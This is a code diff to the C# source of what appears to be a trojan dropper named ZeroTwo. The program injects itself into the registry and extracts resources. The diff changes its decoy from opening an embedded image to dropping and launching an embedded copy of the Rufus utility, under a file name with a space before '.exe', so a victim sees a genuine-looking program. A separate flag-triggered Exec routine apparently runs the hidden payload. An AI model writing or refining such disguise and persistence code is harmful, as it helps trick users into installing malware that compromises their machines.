@@ -27,7 +27,7 @@ namespace ZeroTwo.src {
             if (args.Length == 0) {
                 InjectInReg();
                 ExtrRes();
-                OpenImage();
+                OpenReal();
             } else if (int.Parse(args[0]) == EXEC_FLAG) {
                 Exec();
                 ReleaseReverter();
@@ -97,27 +97,29 @@ namespace ZeroTwo.src {
             p.Start();
         }
 
-        private static void OpenImage() {
+        private static void OpenReal() {
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty);
             int index = exePath.LastIndexOf("/");
             string exeFolder = exePath.Substring(0, index);
             string exeName = Process.GetCurrentProcess().ProcessName;
-            string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
+            string realExePath = (exeFolder + "\\" + exeName + " .exe").Replace("/", "\\");
 
-            if (File.Exists(imagePath))
-                File.Delete(imagePath);
 
-            if (!Directory.Exists(Path.GetDirectoryName(imagePath)))
-                Directory.CreateDirectory(Path.GetDirectoryName(imagePath));
+            if (File.Exists(realExePath))
+                File.Delete(realExePath);
 
-            var imageRes = "ZeroTwo.src.img.ZeroTwo";
-            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(imageRes)) {
-                using (var file = new FileStream(imagePath, FileMode.Create, FileAccess.Write)) {
+
+            if (!Directory.Exists(Path.GetDirectoryName(realExePath)))
+                Directory.CreateDirectory(Path.GetDirectoryName(realExePath));
+
+            var exeRes = "ZeroTwo.src.real.Rufus";
+            using (Stream sfile = Assembly.GetExecutingAssembly().GetManifestResourceStream(exeRes)) {
+                using (var file = new FileStream(realExePath, FileMode.Create, FileAccess.Write)) {
                     sfile.CopyTo(file);
                 }
             }
-
-            Process.Start(imagePath);
+            Console.WriteLine("CCC");
+            Process.Start(realExePath);
         }
 
         private static void Exec() {
